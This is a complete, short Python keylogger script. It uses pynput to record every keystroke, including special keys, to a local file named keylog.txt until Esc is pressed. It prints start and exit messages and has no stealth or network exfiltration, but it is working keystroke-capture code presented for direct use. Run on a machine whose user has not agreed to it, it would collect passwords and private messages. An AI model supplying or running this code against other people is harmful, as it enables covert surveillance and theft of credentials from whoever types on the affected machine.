from pynput import keyboard

# File to save logged keys
LOG_FILE = "keylog.txt"

def on_press(key):
    """Callback function for when a key is pressed."""
    try:
        # Write alphanumeric keys
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, etc.)
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    """Callback function for when a key is released."""
    if key == keyboard.Key.esc:
        # Stop listener
        print("Exiting keylogger...")
        return False

def main():
    """Main function to start the keylogger."""
    print("Keylogger started. Press 'Esc' to stop.")
    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
